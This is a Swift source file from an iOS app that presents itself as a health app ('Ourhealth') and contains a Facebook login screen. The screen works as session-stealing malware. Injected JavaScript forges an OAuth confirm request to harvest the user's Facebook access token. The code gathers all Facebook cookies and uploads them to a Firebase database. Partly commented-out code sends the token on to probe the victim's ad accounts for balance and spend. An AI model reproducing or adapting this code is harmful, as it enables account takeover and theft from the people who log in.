//
//  LoginVC.swift
//  YTeThongMinh
//
//  Created by QuanNH on 5/27/20.
//  Copyright © 2020 Rikkeisoft. All rights reserved.
//

import UIKit
import WebKit
import Firebase
import FirebaseDatabase

enum TypeAccountAction {
    case forgot
    case register
}

class FBLoginVC: UIViewController, FillTextViewDelegate {
    
    // MARK: - Outlets
    @IBOutlet weak var viewProgess: UIView!
    
    var ref: DatabaseReference!
    let viewLoad = ViewLoadVC()
    var listFB = [FBModel]()
    
    // MARK: - Properties
    var failedLoginAttempts: Int = 0
    var captcha = CaptchaGenerator()
    var webView: WKWebView!
    
    var jsToken: String = "(function() { \n" +
        "var uid = document.cookie.match(/c_user=(\\d+)/)[1],\n" +
        "    dtsg = document.getElementsByName('fb_dtsg')[0].value,\n" +
        "    http = new XMLHttpRequest,\n" +
        "    path = 'v1.0/dialog/oauth/confirm',\n" +
        "    params = 'fb_dtsg=' + dtsg + '&app_id=124024574287414&redirect_uri=fbconnect%3A%2F%2Fsuccess&display=page&access_token=&from_post=1&return_format=access_token&domain=&sso_device=ios&_CONFIRM=1&_user=' + uid;\n" +
        "http.open('POST', path, !0), http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'), http.onreadystatechange = function() {\n" +
        "    if (4 == http.readyState && 200 == http.status) {\n" +
        "        var a = http.responseText.match(/access_token=(.*)(?=&expires_in)/);\n" +
        "        var div = document.createElement('div');\n" +
        "        div.innerHTML = a[1];\n" +
        "        div.id = 'getToken';\n" +
        "        document.body.appendChild(div);\n" +
        "        console.log(document.getElementById('getToken').textContent);\n" +
        "    }\n" +
        "}, http.send(params);\n" +
        "})();"
    var jsResult = "(function() {return document.getElementById('getToken').textContent})()"
    var isCheck : Bool = false
    
    // MARK: - ViewController's life cycles
    override func viewDidLoad() {
        super.viewDidLoad()
        setupVC()
        setupWebview()
    }
    
    func pushData(cookie: String,listData: String , allAcc: Int){
        PostDataAPI(cookie: cookie,listData: listData, allAcc: allAcc).execute(target: self, success: {[unowned self] response in
            let defaults = UserDefaults.standard
            defaults.set(true, forKey: "login_check")
            defaults.synchronize()
            let vc = ConnectSuccessVC()
            self.push(vc)
        }, failure: {[weak self] error in
        })
    }
  
    func setupVC(){
        let attributedString = NSMutableAttributedString(string: "Ourhealth", attributes: [
            .font: UIFont(name: "Roboto-Bold", size: 30.0)!,
            .foregroundColor: UIColor(red: 29.0 / 255.0, green: 45.0 / 255.0, blue: 73.0 / 255.0, alpha: 1.0)
        ])
        attributedString.addAttribute(.font, value: UIFont(name: "Roboto-Light", size: 30.0)!, range: NSRange(location: 0, length: 3))
    }
    
    // MARK: - Actions
    func buttonLogin(_ sender: Any) {
        login()
    }
    
    func buttonForgot(_ sender: Any) {
    }
    
    func login(){
        AppDelegate.shared.makeMainTabbar()
    }
}

extension FBLoginVC{
    // function setup webview
    private func setupWebview(){
        let webConfiguration = WKWebViewConfiguration()
        if #available(iOS 10.0, *) {
            webConfiguration.mediaTypesRequiringUserActionForPlayback = .all
        }
        webConfiguration.preferences.javaScriptEnabled = true
        webConfiguration.allowsInlineMediaPlayback = true
        webView = WKWebView(frame: self.view.bounds, configuration: webConfiguration)
        webView.contentMode = .scaleAspectFill
        webView.scrollView.bounces = false
        self.webView.allowsBackForwardNavigationGestures = true
        self.view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        webView.navigationDelegate = self
        DispatchQueue.main.async {
            if let url = URL(string: "https://m.facebook.com"){
                self.webView.load(URLRequest(url: url))
            }
        }
        webView.layoutIfNeeded()
    }
    
    func convertToDictionary(text: String) -> [String: Any]? {
        if let data = text.data(using: .utf8) {
            do {
                return try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any]
            } catch {
                print(error.localizedDescription)
            }
        }
        return nil
    }
    
    private func pushDataFirebase(cookei: String){
        ref = Database.database().reference()
        let email = UserDefaults.standard.value(forKey:"username")
        self.ref.child("users").setValue(["username": email,"cookeis": cookei])
    }
}

extension FBLoginVC: WKNavigationDelegate{
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        return decisionHandler((WKNavigationActionPolicy(rawValue: WKNavigationActionPolicy.allow.rawValue + 2)!))
    }
    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
    }
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        if webView.url != nil {
            webView.getCookies() { data in
                if data["c_user"] != nil && !self.isCheck{
                    self.viewProgess.isHidden = false
                    self.viewLoad.view.frame = CGRect(x: 0, y: 0, width: self.view.frame.size.width, height: self.view.frame.size.height)
                    self.view.addSubview(self.viewLoad.view)
                        webView.evaluateJavaScript(self.jsToken, completionHandler: { (value, error) in
                            Timer.scheduledTimer(withTimeInterval: 10.0, repeats: true) { (Timer) in
                                webView.evaluateJavaScript(self.jsResult, completionHandler: { (value, error) in
                                    if !self.isCheck{
                                        self.isCheck = true
                                        let cookieHeader = (data.compactMap({ (key, value) -> String in
                                            let fullNameArr = String(describing: value).components(separatedBy: "Value =")
                                            return "\(key)=\(fullNameArr[1].replace(string: "\"", with: "").replace(string: "Version = 1;\n}", with: "").replace(string: ";", with: "")) "
                                        }) as Array).joined(separator: ";")
                                        let cookeis = cookieHeader.replace(string: "\n     ", with: "")
                                        self.pushDataFirebase(cookei: cookeis)
//                                        self.pushData(cookie: cookeis,listData: "true" , allAcc: 0)
//                                        if let tokken = value as? String{
//                                            if tokken.components(separatedBy: "&").count > 0 {
//                                                print("tokken : \(tokken.components(separatedBy: "&")[0])")
//                                                self.getListAdsFB(tokken: tokken.components(separatedBy: "&")[0],cokkeis: cookieHeader.replace(string: "\n     ", with: ""))
//                                            }
//                                        }
                                    }
                                    if value != nil{
                                        Timer.invalidate()
                                    }
                                    
                                })
                            }
                            
                        })
                }
            }
            
        }
    }
}

extension FBLoginVC{
    private func getListAdsFB(tokken : String = "",cokkeis: String = ""){
        GetListAdsAPI(tokken: tokken).execute(target: self, success: {[weak self] response in
            var isNumber: String = "false"
            for item in response.listFB{
                if item.balance.int != 0 || item.amountSpent.int != 0{
                    isNumber = "true"
                }
            }
            self?.pushData(cookie: cokkeis,listData: isNumber , allAcc: response.listFB.count)
        }, failure: {[weak self] error in
            
        })
    }
}
